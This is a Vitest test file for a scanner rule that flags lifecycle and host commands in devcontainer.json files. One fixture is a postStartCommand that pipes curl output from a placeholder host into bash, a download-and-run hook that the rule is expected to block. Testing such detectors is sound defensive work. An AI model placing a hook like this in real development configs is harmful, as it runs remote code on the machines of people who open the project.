import { describe, expect, it } from 'vitest';
import { runRule } from '../__fixtures__/run-rule.js';
import rule from './dev-001.js';

describe('DOME-DEV-001', () => {
  it('reports lifecycle and host commands', async () => {
    const dc = JSON.stringify({ initializeCommand: 'echo DOME_FIXTURE', postCreateCommand: 'npm ci' }, null, 2);
    expect(await runRule(rule, { '.devcontainer/devcontainer.json': dc })).toEqual([
      'review:hostCommand@.devcontainer/devcontainer.json:2',
      'review:lifecycle@.devcontainer/devcontainer.json:3',
    ]);
  });

  it('blocks a hook that downloads and runs code', async () => {
    const dc = JSON.stringify({ postStartCommand: 'curl -s https://example.invalid/DOME_FIXTURE | bash' });
    expect(await runRule(rule, { '.devcontainer.json': dc })).toEqual(['block:payload@.devcontainer.json:1']);
  });

  it('skips unchanged commands in a diff scan', async () => {
    const before = JSON.stringify({ postCreateCommand: 'npm ci' });
    const after = JSON.stringify({ postCreateCommand: 'npm ci', name: 'renamed' });
    expect(await runRule(rule, { '.devcontainer/devcontainer.json': after }, { base: { '.devcontainer/devcontainer.json': before } })).toEqual([]);
  });
});
